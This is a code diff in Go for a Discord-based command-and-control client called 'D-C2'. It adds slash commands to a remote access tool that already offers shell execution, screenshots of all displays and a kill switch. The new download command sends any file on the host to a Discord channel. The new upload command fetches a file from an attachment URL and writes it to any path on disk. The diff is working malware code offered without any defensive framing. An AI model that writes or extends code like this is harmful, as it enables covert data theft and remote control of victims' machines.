@@ -2,7 +2,12 @@ package main
 
 import (
 	"fmt"
+	"io"
+	"net/http"
+	"os"
+	"path/filepath"
 	"runtime"
+	"strings"
 
 	"github.com/bwmarrin/discordgo"
 )
@@ -20,21 +25,23 @@ func handleInteraction(s *discordgo.Session, i *discordgo.InteractionCreate) {
 			content := "**D‑C2 Help**\n\n" +
 				"Use these controls in this device channel:\n\n" +
 				"**Slash commands**\n" +
-				"/cmd `<command>`  – run shell command\n" +
-				"/screenshot      – capture screenshots of all displays\n" +
-				"/cwd             – show current working directory\n" +
-				"/ls `[path]`      – list directory (current or given path)\n\n" +
+				"/cmd `<command>`          – run shell command\n" +
+				"/screenshot              – capture screenshots of all displays\n" +
+				"/cwd                     – show current working directory\n" +
+				"/ls `[path]`              – list directory (current or given path)\n" +
+				"/download `<src>` `[dst]` – download file (src path, optional label)\n" +
+				"/upload `<file>` `<dst>`  – upload attached file to dst path\n\n" +
 				"**Emoji commands**\n" +
-				"📸              – capture screenshots of all displays\n" +
-				"👇 `<path>`      – download file from this machine (size < 8 MB)\n" +
-				"☝️ `<path>` *attach – upload attached file to this path\n" +
-				"💀              – terminate this client\n\n" +
+				"📸                        – capture screenshots of all displays\n" +
+				"👇 `<path>`                – download file from this machine (size < 8 MB)\n" +
+				"☝️ `<path>` *attach         – upload attached file to this path\n" +
+				"💀                        – terminate this client\n\n" +
 				"**Buttons**\n" +
-				"whoami    – show current user\n" +
-				"id        – show user / UID information\n" +
-				"hostname  – show device hostname\n" +
-				"ip info   – show IP configuration\n" +
-				"cwd       – show current working directory\n\n" +
+				"whoami                    – show current user\n" +
+				"id                        – show user / UID information\n" +
+				"hostname                  – show device hostname\n" +
+				"ip info                   – show IP configuration\n" +
+				"cwd                       – show current working directory\n\n" +
 				"Send `help` or `/help` anytime to show this help again."
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 				Type: discordgo.InteractionResponseChannelMessageWithSource,
@@ -160,6 +167,150 @@ func handleInteraction(s *discordgo.Session, i *discordgo.InteractionCreate) {
 				},
 			})
 			runCommandString(s, i.ChannelID, nil, cmdStr)
+		case "download":
+			var srcPath string
+			for _, opt := range data.Options {
+				if opt.Name == "source" {
+					srcPath = opt.StringValue()
+				}
+			}
+			if srcPath == "" {
+				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
+					Type: discordgo.InteractionResponseChannelMessageWithSource,
+					Data: &discordgo.InteractionResponseData{
+						Content: "No source path provided.",
+						Flags:   discordgo.MessageFlagsEphemeral,
+					},
+				})
+				return
+			}
+			if strings.HasPrefix(srcPath, "~/") {
+				if home, err := os.UserHomeDir(); err == nil {
+					srcPath = home + string(os.PathSeparator) + srcPath[2:]
+				}
+			}
+			f, err := os.Open(srcPath)
+			if err != nil {
+				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
+					Type: discordgo.InteractionResponseChannelMessageWithSource,
+					Data: &discordgo.InteractionResponseData{
+						Content: "Cannot open file: " + srcPath + " (" + err.Error() + ")",
+						Flags:   discordgo.MessageFlagsEphemeral,
+					},
+				})
+				return
+			}
+			defer f.Close()
+			fi, err := f.Stat()
+			if err != nil {
+				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
+					Type: discordgo.InteractionResponseChannelMessageWithSource,
+					Data: &discordgo.InteractionResponseData{
+						Content: "Cannot stat file: " + srcPath + " (" + err.Error() + ")",
+						Flags:   discordgo.MessageFlagsEphemeral,
+					},
+				})
+				return
+			}
+			if fi.Size() >= 8388608 {
+				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
+					Type: discordgo.InteractionResponseChannelMessageWithSource,
+					Data: &discordgo.InteractionResponseData{
+						Content: "File is bigger than 8MB 😔",
+						Flags:   discordgo.MessageFlagsEphemeral,
+					},
+				})
+				return
+			}
+			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
+				Type: discordgo.InteractionResponseChannelMessageWithSource,
+				Data: &discordgo.InteractionResponseData{
+					Content: "📥 Downloading `" + filepath.Base(srcPath) + "`...",
+					Flags:   discordgo.MessageFlagsEphemeral,
+				},
+			})
+			fileStruct := &discordgo.File{Name: filepath.Base(srcPath), Reader: f}
+			fileArray := []*discordgo.File{fileStruct}
+			s.ChannelMessageSendComplex(i.ChannelID, &discordgo.MessageSend{
+				Files: fileArray,
+			})
+		case "upload":
+			var destPath string
+			var attachment *discordgo.MessageAttachment
+			for _, opt := range data.Options {
+				if opt.Name == "destination" {
+					destPath = opt.StringValue()
+				}
+				if opt.Name == "source" {
+					if data.Resolved != nil && data.Resolved.Attachments != nil {
+						if id, ok := opt.Value.(string); ok {
+							if a, ok := data.Resolved.Attachments[id]; ok {
+								attachment = a
+							}
+						}
+					}
+				}
+			}
+			if destPath == "" || attachment == nil {
+				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
+					Type: discordgo.InteractionResponseChannelMessageWithSource,
+					Data: &discordgo.InteractionResponseData{
+						Content: "Source attachment and destination path are required.",
+						Flags:   discordgo.MessageFlagsEphemeral,
+					},
+				})
+				return
+			}
+			if strings.HasPrefix(destPath, "~/") {
+				if home, err := os.UserHomeDir(); err == nil {
+					destPath = home + string(os.PathSeparator) + destPath[2:]
+				}
+			}
+			if info, err := os.Stat(destPath); err == nil && info.IsDir() {
+				destPath = filepath.Join(destPath, attachment.Filename)
+			}
+			out, err := os.Create(destPath)
+			if err != nil {
+				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
+					Type: discordgo.InteractionResponseChannelMessageWithSource,
+					Data: &discordgo.InteractionResponseData{
+						Content: "Cannot create file: " + destPath + " (" + err.Error() + ")",
+						Flags:   discordgo.MessageFlagsEphemeral,
+					},
+				})
+				return
+			}
+			defer out.Close()
+			resp, err := http.Get(attachment.URL)
+			if err != nil {
+				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
+					Type: discordgo.InteractionResponseChannelMessageWithSource,
+					Data: &discordgo.InteractionResponseData{
+						Content: "Download failed: " + err.Error(),
+						Flags:   discordgo.MessageFlagsEphemeral,
+					},
+				})
+				return
+			}
+			defer resp.Body.Close()
+			_, err = io.Copy(out, resp.Body)
+			if err != nil {
+				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
+					Type: discordgo.InteractionResponseChannelMessageWithSource,
+					Data: &discordgo.InteractionResponseData{
+						Content: "Write failed: " + err.Error(),
+						Flags:   discordgo.MessageFlagsEphemeral,
+					},
+				})
+				return
+			}
+			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
+				Type: discordgo.InteractionResponseChannelMessageWithSource,
+				Data: &discordgo.InteractionResponseData{
+					Content: "☝️ Uploaded file to " + destPath,
+					Flags:   discordgo.MessageFlagsEphemeral,
+				},
+			})
 		default:
 		}
 	case discordgo.InteractionMessageComponent:
